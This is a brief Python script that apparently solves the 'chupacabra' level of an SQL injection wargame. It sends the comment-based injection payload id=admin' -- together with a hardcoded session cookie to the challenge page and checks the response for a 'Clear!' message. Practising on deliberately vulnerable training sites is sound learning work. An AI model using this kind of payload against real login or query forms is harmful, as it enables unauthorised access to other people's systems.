import requests

url = "https://los.rubiya.kr/chall/chupacabra_8568ab6205bea61d634a8cc67484a35c.php?"
cookie = {'PHPSESSID':'l76vhg3a57sh6gnch2itdmvsoj'}

def solve():
    query = "id=admin%27%20--%20"
    res = requests.get(url=url+query, cookies=cookie)
    if "CHUPACABRA Clear!" in res.text:
        print("CHUPACABRA Clear!")

if __name__ == "__main__":
    solve()
